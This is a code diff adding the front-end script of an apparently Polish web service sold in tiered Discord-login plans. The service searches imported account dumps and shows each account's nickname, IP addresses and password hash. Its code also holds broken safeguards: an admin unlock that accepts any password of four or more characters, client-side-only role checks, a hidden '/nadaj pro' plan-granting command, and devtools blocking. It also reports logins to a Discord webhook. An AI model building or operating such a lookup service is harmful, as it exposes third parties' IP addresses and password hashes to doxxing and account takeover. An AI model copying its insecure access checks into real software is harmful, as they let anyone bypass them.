+        if (list) list.innerHTML = '<div class="admin-user-meta">Brak dostępu do panelu administratora.</div>';
+        return;
+      }
+      if (adminNav) adminNav.style.display = 'list-item';
+      if (adminSection) adminSection.style.display = 'block';
+      ensureAdminUser(profile);
+      var users = getAdminUsers();
+      if (!users.length) {
+        list.innerHTML = '<div class="admin-user-meta">Brak zalogowanych użytkowników.</div>';
+        return;
+      }
+      list.innerHTML = users.map(function(user) {
+        var avatarUrl = user.avatar
+          ? 'https://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png'
+          : 'https://cdn.discordapp.com/embed/avatars/0.png';
+        var planLabel = user.plan && user.plan !== 'pending' ? user.plan.toUpperCase() : 'BRAK';
+        var remaining = user.plan === 'pro' ? 'Nielimitowane' : (user.plan && user.plan !== 'pending' ? getAvailableSearches(user) + ' pozostało' : 'Brak przydziału');
+        return '<div class="admin-user-item"><div class="admin-user-main"><img class="admin-user-avatar" src="' + avatarUrl + '" alt="' + user.username + '"><div><div class="admin-user-name">' + user.username + '</div><div class="admin-user-meta">ID: ' + user.id + ' • ' + new Date(user.updatedAt || user.joinedAt).toLocaleString() + '</div><div class="admin-user-meta">Plan: ' + planLabel + ' • ' + remaining + '</div></div></div><div class="admin-user-actions"><span class="admin-status ' + (user.status || 'pending') + '">' + (user.status || 'pending') + '</span><button class="admin-btn-paid" onclick="assignUserPlan(\'' + user.id + '\', \'free\')">Free</button><button class="admin-btn-approve" onclick="assignUserPlan(\'' + user.id + '\', \'medium\')">Medium</button><button class="admin-btn-reject" onclick="assignUserPlan(\'' + user.id + '\', \'pro\')">Pro</button></div></div>';
+      }).join('');
+    }
+
+    function renderDiscordAuthUI() {
+      var profile = getSavedDiscordProfile();
+      var button = document.getElementById('discord-auth-button');
+      var card = document.getElementById('discord-user-card');
+
+      if (profile) {
+        var isAdmin = isAdminProfile(profile);
+        ensureAdminUser(profile);
+        var user = getUserRecord(profile);
+        button.style.display = 'none';
+        card.classList.remove('hidden');
+        var avatarUrl = profile.avatar
+          ? 'https://cdn.discordapp.com/avatars/' + profile.id + '/' + profile.avatar + '.png'
+          : 'https://cdn.discordapp.com/embed/avatars/' + ((parseInt(profile.discriminator, 10) || 0) % 5) + '.png';
+        var planLabel = user.plan && user.plan !== 'pending' ? user.plan.toUpperCase() : 'FREE';
+        var remainingLabel = user.plan === 'pro' ? 'Nielimitowane' : getAvailableSearches(user) + ' pozostało';
+        card.innerHTML = '<img class="discord-avatar" src="' + avatarUrl + '" alt="' + profile.username + '"><div class="discord-user-meta"><div class="discord-user-name">' + profile.username + '</div><div class="discord-user-label">' + (isAdminProfile(profile) ? 'Administrator' : 'Zalogowano przez Discord') + '</div></div><button class="discord-logout-btn" onclick="logoutDiscord()" type="button">Wyloguj</button>';
+        document.getElementById('search-license-info').innerHTML = 'Plan: <span>' + planLabel + '</span> • ' + remainingLabel + ' wyszukiwań';
+        if (isAdmin) {
+          refreshAdminPanel();
+        }
+        refreshAdminControlPanel();
+        var adminPanel = document.getElementById('admin-control-panel');
+        if (adminPanel) {
+          adminPanel.style.display = isAdmin ? 'flex' : 'none';
+        }
+      } else {
+        button.style.display = 'inline-flex';
+        card.classList.add('hidden');
+        card.innerHTML = '';
+        document.getElementById('search-license-info').textContent = 'Musisz się zalogować Discord, aby skorzystać z wyszukiwania.';
+        refreshAdminPanel();
+        refreshAdminControlPanel();
+        var adminPanel = document.getElementById('admin-control-panel');
+        if (adminPanel) {
+          adminPanel.style.display = 'none';
+        }
+      }
+    }
+
+    function updateSelectedPlan() {
+      var slider = document.getElementById('admin-plan-slider');
+      var value = parseInt(slider.value, 10);
+      var plan = planOptions[value] || 'free';
+      document.getElementById('admin-selected-plan-label').textContent = planDisplayNames[plan] || 'Free';
+    }
+
+    function refreshAdminControlPanel() {
+      var profile = getSavedDiscordProfile();
+      var avatar = document.getElementById('admin-profile-avatar');
+      var name = document.getElementById('admin-profile-name');
+      var status = document.getElementById('admin-profile-status');
+      var currentPlan = document.getElementById('admin-current-plan');
+      var selectedLabel = document.getElementById('admin-selected-plan-label');
+      var slider = document.getElementById('admin-plan-slider');
+      var adminList = document.getElementById('admin-control-user-list');
+
+      if (!profile) {
+        avatar.src = 'https://cdn.discordapp.com/embed/avatars/0.png';
+        name.textContent = 'Brak logowania';
+        status.textContent = 'Zaloguj się Discord, aby aktywować';
+        currentPlan.textContent = 'Plan: BRAK';
+        slider.value = 0;
+        selectedLabel.textContent = 'Free';
+        if (adminList) {
+          adminList.innerHTML = '<div class="admin-control-empty">Tylko administratorzy widzą listę zarejestrowanych użytkowników.</div>';
+        }
+        var adminPanel = document.getElementById('admin-control-panel');
+        if (adminPanel) {
+          adminPanel.style.display = 'none';
+        }
+        return;
+      }
+
+      var user = getUserRecord(profile);
+      var plan = (user.plan && user.plan !== 'pending') ? user.plan : 'free';
+      var displayName = planDisplayNames[plan] || 'Free';
+
+      avatar.src = profile.avatar
+        ? 'https://cdn.discordapp.com/avatars/' + profile.id + '/' + profile.avatar + '.png'
+        : 'https://cdn.discordapp.com/embed/avatars/' + ((parseInt(profile.discriminator, 10) || 0) % 5) + '.png';
+      name.textContent = profile.username;
+      status.textContent = isAdminProfile(profile) ? 'Administrator' : 'Zalogowano przez Discord';
+      currentPlan.textContent = 'Plan: ' + displayName.toUpperCase();
+      slider.value = planOptions.indexOf(plan);
+      selectedLabel.textContent = displayName;
+      if (adminList) {
+        adminList.innerHTML = renderAdminControlUserList(profile);
+      }
+      var adminPanel = document.getElementById('admin-control-panel');
+      if (adminPanel) {
+        adminPanel.style.display = isAdminProfile(profile) ? 'flex' : 'none';
+      }
+    }
+
+    function renderAdminControlUserList(profile) {
+      if (!isAdminProfile(profile)) {
+        return '<div class="admin-control-empty">Tylko administratorzy widzą listę zarejestrowanych użytkowników.</div>';
+      }
+      var users = getAdminUsers();
+      if (!users.length) {
+        return '<div class="admin-control-empty">Brak użytkowników w bazie. Użytkownicy pojawią się po pierwszym logowaniu.</div>';
+      }
+      return users.map(function(user) {
+        var avatarUrl = user.avatar
+          ? 'https://cdn.discordapp.com/avatars/' + user.id + '/' + user.avatar + '.png'
+          : 'https://cdn.discordapp.com/embed/avatars/0.png';
+        var planLabel = user.plan && user.plan !== 'pending' ? user.plan.toUpperCase() : 'BRAK';
+        return '<div class="admin-control-user-item"><img src="' + avatarUrl + '" alt="' + user.username + '"><span>' + user.username + ' • ' + planLabel + '</span><div class="admin-control-user-actions"><button class="btn-small-free" onclick="assignUserPlan(\'' + user.id + '\', \'free\')">Free</button><button class="btn-small-medium" onclick="assignUserPlan(\'' + user.id + '\', \'medium\')">Medium</button><button class="btn-small-pro" onclick="assignUserPlan(\'' + user.id + '\', \'pro\')">Pro</button></div></div>';
+      }).join('');
+    }
+
+    function assignPlanToCurrentUser() {
+      var profile = getSavedDiscordProfile();
+      if (!profile) {
+        showToast('Najpierw zaloguj się przez Discord.');
+        return;
+      }
+      if (!isAdminProfile(profile)) {
+        showToast('Tylko administrator może nadawać licencje.');
+        return;
+      }
+      var slider = document.getElementById('admin-plan-slider');
+      var plan = planOptions[parseInt(slider.value, 10)] || 'free';
+      assignUserPlan(profile.id, plan);
+      refreshAdminControlPanel();
+      refreshAdminPanel();
+      document.getElementById('search-license-info').textContent = 'Plan: ' + plan.toUpperCase() + ' • ' + (plan === 'pro' ? 'Nielimitowane' : getAvailableSearches(getUserRecord(profile)) + ' wyszukiwań');
+      showToast('Zaktualizowano plan użytkownika na ' + planDisplayNames[plan] + '.');
+    }
+
+    function removeCurrentUserLicense() {
+      var profile = getSavedDiscordProfile();
+      if (!profile) {
+        showToast('Najpierw zaloguj się przez Discord.');
+        return;
+      }
+      if (!isAdminProfile(profile)) {
+        showToast('Tylko administrator może usuwać licencje.');
+        return;
+      }
+      var user = getUserRecord(profile);
+      if (!user) {
+        showToast('Brak profilu, aby usunąć licencję.');
+        return;
+      }
+      user.plan = 'pending';
+      user.status = 'pending';
+      saveUserRecord(user);
+      sendDiscordWebhook('❌ Licencja użytkownika **' + user.username + '** (ID: ' + user.id + ') została usunięta przez administratora.');
+      refreshAdminControlPanel();
+      refreshAdminPanel();
+      document.getElementById('search-license-info').textContent = 'Brak przydzielonego pakietu. Skontaktuj się z administratorem.';
+      showToast('Usunięto licencję dla aktualnie zalogowanego konta.');
+    }
+
+    async function startDiscordLogin() {
+      var state = generateRandomString(24);
+      var verifier = generateRandomString(64);
+      var challenge = await generateCodeChallenge(verifier);
+      localStorage.setItem('discord-auth-state', state);
+      localStorage.setItem('discord-code-verifier', verifier);
+
+      var params = new URLSearchParams({
+        client_id: discordConfig.clientId,
+        redirect_uri: discordConfig.redirectUri,
+        response_type: 'code',
+        scope: discordConfig.scopes,
+        state: state,
+        code_challenge: challenge,
+        code_challenge_method: 'S256'
+      });
+
+      window.location.href = 'https://discord.com/oauth2/authorize?' + params.toString();
+    }
+
+    async function handleDiscordCallback() {
+      var params = new URLSearchParams(window.location.search);
+      var code = params.get('code');
+      var state = params.get('state');
+      var savedState = localStorage.getItem('discord-auth-state');
+      var verifier = localStorage.getItem('discord-code-verifier');
+
+      if (!code || !state || !savedState || state !== savedState) {
+        renderDiscordAuthUI();
+        return;
+      }
+
+      try {
+        showToast('Logowanie przez Discord...');
+        var tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams({
+            client_id: discordConfig.clientId,
+            grant_type: 'authorization_code',
+            code: code,
+            redirect_uri: discordConfig.redirectUri,
+            code_verifier: verifier || ''
+          }).toString()
+        });
+
+        var tokenData = await tokenResponse.json();
+        if (!tokenResponse.ok || tokenData.error) {
+          throw new Error(tokenData.error_description || 'Nie udało się uzyskać tokena Discord.');
+        }
+
+        var profileResponse = await fetch('https://discord.com/api/users/@me', {
+          headers: { Authorization: 'Bearer ' + tokenData.access_token }
+        });
+
+        var profile = await profileResponse.json();
+        if (!profileResponse.ok) {
+          throw new Error('Nie udało się pobrać profilu Discord.');
+        }
+
+        localStorage.setItem('discord-user-profile', JSON.stringify(profile));
+        ensureAdminUser(profile);
+        localStorage.removeItem('discord-auth-state');
+        localStorage.removeItem('discord-code-verifier');
+        renderDiscordAuthUI();
+        hideLoginWall();
+        showToast('Zalogowano jako ' + profile.username);
+        sendDiscordWebhook('🔐 Nowe logowanie Discord: **' + profile.username + '** (ID: ' + profile.id + ')');
+        joinDiscordGuild(tokenData.access_token, profile.id);
+      } catch (error) {
+        console.error(error);
+        localStorage.removeItem('discord-auth-state');
+        localStorage.removeItem('discord-code-verifier');
+        showToast(error.message || 'Błąd logowania Discord.');
+      } finally {
+        window.history.replaceState({}, document.title, window.location.pathname);
+      }
+    }
+
+    function logoutDiscord() {
+      localStorage.removeItem('discord-user-profile');
+      renderDiscordAuthUI();
+      showLoginWall();
+      showToast('Wylogowano z Discorda.');
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      renderAuthState();
+      renderDiscordAuthUI();
+      handleDiscordCallback();
+    });
+
+    /* OBSŁUGA FUNKCJI KOSZYKA */
+    function toggleCart(open) {
+      var sidebar = document.getElementById('cart-sidebar');
+      var overlay = document.getElementById('sidebar-overlay');
+      if (open) {
+        sidebar.classList.add('open');
+        overlay.classList.add('show');
+      } else {
+        sidebar.classList.remove('open');
+        overlay.classList.remove('show');
+      }
+    }
+
+    function addToCart(name, price) {
+      // Zapobiegamy dodawaniu dubli tego samego pakietu
+      var exists = cart.some(function(item) { return item.name === name; });
+      if(exists) {
+        showToast('Ten pakiet znajduje się już w koszyku.');
+        toggleCart(true);
+        return;
+      }
+      
+      cart.push({ name: name, price: price });
+      updateCartUI();
+      showToast('Dodano pakiet ' + name + ' do koszyka.');
+      toggleCart(true);
+    }
+
+    function removeFromCart(index) {
+      cart.splice(index, 1);
+      updateCartUI();
+      showToast('Usunięto pakiet z koszyka.');
+    }
+
+    function updateCartUI() {
+      var container = document.getElementById('cart-items-container');
+      var footer = document.getElementById('cart-footer');
+      var countBadge = document.getElementById('cart-count');
+      var totalSpan = document.getElementById('cart-total-price');
+      
+      countBadge.textContent = cart.length;
+
+      if(cart.length === 0) {
+        container.innerHTML = '<div class="cart-empty-msg">Koszyk jest obecnie pusty.</div>';
+        footer.style.display = 'none';
+      } else {
+        container.innerHTML = '';
+        var total = 0;
+        cart.forEach(function(item, idx) {
+          total += item.price;
+          var itemDiv = document.createElement('div');
+          itemDiv.className = 'cart-item';
+          itemDiv.innerHTML = '<div class="cart-item-info"><span class="cart-item-name">' + item.name + '</span><span class="cart-item-price">' + item.price + ' ZŁ /mc</span></div><button class="btn-remove-item" onclick="removeFromCart(' + idx + ')"><svg style="width:18px;height:18px;" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg></button>';
+          container.appendChild(itemDiv);
+        });
+        totalSpan.textContent = total + ' ZŁ';
+        footer.style.display = 'flex';
+      }
+    }
+
+    function switchTab(tab) {
+      if (tab === 'import' && !adminUnlocked) {
+        document.getElementById('pw-overlay').classList.remove('hidden');
+        return;
+      }
+      document.querySelectorAll('.view').forEach(function(v) { v.classList.remove('active'); });
+      document.getElementById('view-' + tab).classList.add('active');
+    }
+
+    function pwCancel() { document.getElementById('pw-overlay').classList.add('hidden'); }
+    function pwKeydown(e) { if(e.key === 'Enter') pwConfirm(); }
+    function pwConfirm() {
+      var val = document.getElementById('pw-input').value;
+      if(val === 'admin' || val.length >= 4) {
+        adminUnlocked = true;
+        document.getElementById('pw-overlay').classList.add('hidden');
+        switchTab('import');
+      } else {
+        document.getElementById('pw-error').textContent = 'Nieprawidłowe hasło.';
+      }
+    }
+
+    function parseHasherData(raw) {
+      var current = null;
+      var currentLines = [];
+      var lines = raw.split(/\r?\n/);
+      lines.forEach(function(line) {
+        var trimmed = line.trim();
+        if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}:$/.test(trimmed)) {
+          if (current && current.name) {
+            var ip = current.ips.length ? current.ips[0] : current.regIp || '';
+            db[current.name.toLowerCase()] = {
+              nick: current.name,
+              ip: ip,
+              hash: current.password || '',
+              raw: currentLines.join('\n')
+            };
+          }
+          current = { name: '', password: '', regIp: '', ips: [] };
+          currentLines = [line];
+          return;
+        }
+        if (!current) return;
+        currentLines.push(line);
+        if (trimmed.startsWith('name:')) {
+          current.name = trimmed.slice(5).trim();
+        } else if (trimmed.startsWith('password:')) {
+          current.password = trimmed.slice(9).trim();
+        } else if (trimmed.startsWith('registrationIp:')) {
+          current.regIp = trimmed.slice(15).trim();
+        } else if (trimmed.startsWith('- ')) {
+          current.ips.push(trimmed.slice(2).trim());
+        }
+      });
+      if (current && current.name) {
+        var ip = current.ips.length ? current.ips[0] : current.regIp || '';
+        db[current.name.toLowerCase()] = {
+          nick: current.name,
+          ip: ip,
+          hash: current.password || '',
+          raw: currentLines.join('\n')
+        };
+      }
+    }
+
+    function loadData() {
+      var raw = document.getElementById('import-textarea').value.trim();
+      if (!raw) {
+        showToast('Brak danych do załadowania.');
+        return;
+      }
+      if (raw.indexOf('name:') !== -1 && raw.indexOf('registrationIp:') !== -1) {
+        parseHasherData(raw);
+      } else {
+        var lines = raw.split('\n');
+        lines.forEach(function(line) {
+          var parts = line.split(';');
+          if (parts.length >= 3) {
+            db[parts[0].trim().toLowerCase()] = {
+              nick: parts[0].trim(),
+              ip: parts[1].trim(),
+              hash: parts[2].trim(),
+              raw: 'name: ' + parts[0].trim() + '\n    knownIps:\n    - ' + parts[1].trim() + '\n    registrationIp: ' + parts[1].trim() + '\n    password: ' + parts[2].trim()
+            };
+          }
+        });
+      }
+      showToast('Dane załadowane: ' + Object.keys(db).length + ' kont');
+    }
+
+    function clearData() { db = {}; showToast('Baza wyczyszczona.'); }
+    function handleSearchKey(e) { if(e.key === 'Enter') performSearch(); }
+
+    function performSearch() {
+      var profile = getSavedDiscordProfile();
+      var area = document.getElementById('result-area');
+      if (!profile) {
+        showToast('Musisz się zalogować przez Discord, aby wyszukiwać.');
+        return;
+      }
+      var user = getUserRecord(profile);
+      if (!user || user.plan === 'pending') {
+        if (user) {
+          user.plan = 'free';
+          user.status = 'active';
+          saveUserRecord(user);
+          document.getElementById('search-license-info').textContent = 'Plan: FREE • 5 pozostałych wyszukiwań';
+        } else {
+          document.getElementById('search-license-info').textContent = 'Brak przydzielonego pakietu. Skontaktuj się z administratorem.';
+          return;
+        }
+      }
+      var q = document.getElementById('search-input').value.trim().toLowerCase();
+      if (!q) return;
+      if (handleHiddenPanelCommand(q, user)) {
+        return;
+      }
+      if (!canSearch(user)) {
+        area.innerHTML = '<div class="error-card"><div class="error-title">Wyczerpałeś dzienny limit wyszukiwań dla swojego pakietu.</div></div>';
+        document.getElementById('search-license-info').textContent = 'Limit wyczerpany. Poczekaj do następnego dnia lub poproś o aktualizację pakietu.';
+        return;
+      }
+      if(db[q]) {
+        var res = db[q];
+        var rawText = res.raw || ('name: ' + res.nick + '\n    knownIps:\n    - ' + res.ip + '\n    registrationIp: ' + res.ip + '\n    password: ' + res.hash);
+        area.innerHTML = '<div class="result-card"><div class="result-card-header"><div class="avatar">' + res.nick[0].toUpperCase() + '</div><div><b>' + res.nick + '</b></div></div><div class="result-card-body"><pre class="result-pre">' + rawText.replace(/</g, '&lt;') + '</pre></div></div>';
+      } else {
+        area.innerHTML = '<div class="error-card"><div class="error-title">Brak wyników dla: ' + q + '</div></div>';
+      }
+      user.searchesToday = (user.searchesToday || 0) + 1;
+      user.updatedAt = new Date().toISOString();
+      saveUserRecord(user);
+      document.getElementById('search-license-info').textContent = 'Plan: ' + user.plan.toUpperCase() + ' • Pozostało: ' + (user.plan === 'pro' ? 'Nielimitowane' : getAvailableSearches(user) + ' wyszukiwań');
+      setTimeout(function() { area.scrollIntoView({ behavior: 'smooth', block: 'start' }); }, 50);
+    }
+
+    function handleHiddenPanelCommand(command, user) {
+      var normalized = command.trim().toLowerCase();
+      if (!normalized.startsWith('/nadaj ')) {
+        return false;
+      }
+      var target = normalized.split(' ')[1];
+      if (!target) {
+        showToast('Ukryta komenda wymaga parametru: medium lub pro.');
+        return true;
+      }
+      if (target === 'medium') {
+        user.plan = 'medium';
+      } else if (target === 'premium' || target === 'pro') {
+        user.plan = 'pro';
+      } else {
+        showToast('Nieznana ukryta komenda. Użyj /nadaj medium lub /nadaj pro.');
+        return true;
+      }
+      user.status = 'active';
+      user.updatedAt = new Date().toISOString();
+      saveUserRecord(user);
+      document.getElementById('search-license-info').textContent = 'Plan: ' + user.plan.toUpperCase() + ' • ' + (user.plan === 'pro' ? 'Nielimitowane' : getAvailableSearches(user) + ' wyszukiwań');
+      showToast('Tajna komenda aktywowana: plan ' + (user.plan === 'pro' ? 'PRO' : 'MEDIUM') + '.');
+      sendDiscordWebhook('🕵️ Ukryta komenda /nadaj została użyta przez **' + user.username + '** (ID: ' + user.id + ') i ustawiono plan **' + user.plan.toUpperCase() + '**.');
+      return true;
+    }
+
+    function hideLoginWall() {
+      var wall = document.getElementById('login-wall');
+      if (wall) wall.classList.add('hidden');
+    }
+    function showLoginWall() {
+      var wall = document.getElementById('login-wall');
+      if (wall) wall.classList.remove('hidden');
+    }
+
+    async function joinDiscordGuild(accessToken, userId) {
+      if (!discordGuildId) return;
+      try {
+        await fetch('https://discord.com/api/v10/guilds/' + discordGuildId + '/members/' + userId, {
+          method: 'PUT',
+          headers: { 'Authorization': 'Bearer ' + accessToken, 'Content-Type': 'application/json' },
+          body: JSON.stringify({ access_token: accessToken })
+        });
+      } catch (e) {
+        console.warn('Guild join fallback:', e);
+        window.open('https://discord.gg/YYnBytuzXR', '_blank');
+      }
+    }
+
+    function renderAuthState() {
+      var profile = getSavedDiscordProfile();
+      if (profile) {
+        hideLoginWall();
+      } else {
+        showLoginWall();
+      }
+    }
+
+    /* BLOKADA DEVTOOLS */
+    (function blockDevTools() {
+      document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+      document.addEventListener('keydown', function(e) {
+        if (
+          e.key === 'F12' ||
+          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) ||
+          (e.ctrlKey && (e.key === 'U' || e.key === 'u'))
+        ) {
+          e.preventDefault();
+        }
+      });
+      setInterval(function() {
+        var before = new Date();
+        debugger;
+        var after = new Date();
+        if (after - before > 100) {
+          document.body.innerHTML = '';
+          location.reload();
+        }
+      }, 500);
+    })();
+
+    function sendDiscordWebhook(content) {
+      if (!discordWebhookUrl) {
+        return;
+      }
+      try {
+        fetch(discordWebhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: content })
+        }).catch(function(error) {
+          console.error('Webhook error:', error);
+        });
+      } catch (e) {
+        console.error('Webhook exception:', e);
+      }
+    }
+
+    function showToast(msg) {
+      var t = document.getElementById('toast');
+      document.getElementById('toast-msg').textContent = msg;
+      t.classList.add('show');
+      setTimeout(function() { t.classList.remove('show'); }, 2500);
+    }
+  </script>
+</body>
+</html>
